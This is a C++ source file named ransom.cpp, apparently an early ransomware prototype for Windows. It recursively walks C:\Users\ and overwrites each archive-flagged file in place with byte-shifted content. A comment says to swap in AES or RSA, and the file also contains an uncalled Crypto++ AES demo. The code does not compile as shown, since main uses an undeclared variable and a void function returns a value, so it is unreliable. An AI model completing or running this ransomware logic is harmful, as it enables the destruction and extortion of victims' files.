// ransom.cpp 

#include "cryptlib.h"
#include "rijndael.h"
#include "modes.h"
#include "files.h"
#include "osrng.h"
#include "hex.h"

#include <iostream>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fstream>		//file handling
#include <dirent.h>		//reading directory
#include <Windows.h>

using namespace std;

void encryptFile(string fileName) {
	fstream sourceFile, tempFile;
	string tempFileName = "temp.txt";
	char byte; //char is 1 byte in size

	//open file stream
	sourceFile.open(fileName, ios::in);
	tempFile.open(tempFileName, ios::out | ios::trunc);

	//very simple just add 1 byte
	//replace this with AES or RSA
	while (sourceFile >> noskipws >> byte) {
		byte += 1; //encrypt byte by adding 1
		tempFile << byte;
	}


	//close file stream
	sourceFile.close();
	tempFile.close();

	//open file stream and write from tempfile to sroucefile
	sourceFile.open(fileName, ios::out | ios::trunc);
	tempFile.open(tempFileName, ios::in);

	//write temp file to source file
	while (tempFile >> noskipws >> byte) {
		sourceFile << byte;
	}

	//close stream and delete temp file
	sourceFile.close();
	tempFile.close();
	remove(tempFileName.c_str());
}

//go through the file system
void files_tree(const char* folder) {

	char wildcard[MAX_PATH];
	sprintf(wildcard, "%s\\*", folder);
	WIN32_FIND_DATA fd;
	HANDLE handle = FindFirstFile(wildcard, &fd);

	if (handle == INVALID_HANDLE_VALUE) return;

	do {

		if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
			continue;

		char path[MAX_PATH];
		sprintf(path, "%s\\%s", folder, fd.cFileName);

		if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && !(fd.dwFileAttributes & (FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_DEVICE)))
			files_tree(path);

		if (fd.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE)
			encryptFile(path);
			//puts(path);

	} while (FindNextFile(handle, &fd));

	FindClose(handle);
}

//aes encryption
void aesEnc(int argc, char* argv[])
{
    using namespace CryptoPP;

    AutoSeededRandomPool prng;
    HexEncoder encoder(new FileSink(std::cout));

    SecByteBlock key(AES::DEFAULT_KEYLENGTH);
    SecByteBlock iv(AES::BLOCKSIZE);

    prng.GenerateBlock(key, key.size());
    prng.GenerateBlock(iv, iv.size());

    std::string plain = "CBC Mode Test";
    std::string cipher, recovered;

    std::cout << "plain text: " << plain << std::endl;

    /*********************************\
    \*********************************/

    try
    {
        CBC_Mode< AES >::Encryption e;
        e.SetKeyWithIV(key, key.size(), iv);

        StringSource s(plain, true, 
            new StreamTransformationFilter(e,
                new StringSink(cipher)
            ) // StreamTransformationFilter
        ); // StringSource
    }
    catch(const Exception& e)
    {
        std::cerr << e.what() << std::endl;
        exit(1);
    }

    /*********************************\
    \*********************************/

    std::cout << "key: ";
    encoder.Put(key, key.size());
    encoder.MessageEnd();
    std::cout << std::endl;

    std::cout << "iv: ";
    encoder.Put(iv, iv.size());
    encoder.MessageEnd();
    std::cout << std::endl;

    std::cout << "cipher text: ";
    encoder.Put((const byte*)&cipher[0], cipher.size());
    encoder.MessageEnd();
    std::cout << std::endl;
    
    /*********************************\
    \*********************************/

    try
    {
        CBC_Mode< AES >::Decryption d;
        d.SetKeyWithIV(key, key.size(), iv);

        StringSource s(cipher, true, 
            new StreamTransformationFilter(d,
                new StringSink(recovered)
            ) // StreamTransformationFilter
        ); // StringSource

        std::cout << "recovered text: " << recovered << std::endl;
    }
    catch(const Exception& e)
    {
        std::cerr << e.what() << std::endl;
        exit(1);
    }

    return 0;
}

//main
int main() {
	//encrypt only users dir
	string directoryUsers = "C:\\Users\\";

	//cout << "Enter dir to encrypt: ";
	//cin >> directoryName;
	//fflush(stdin);

	std::string str;
	const char* c = directoryName.c_str();
	files_tree(c);

	return 0;
}
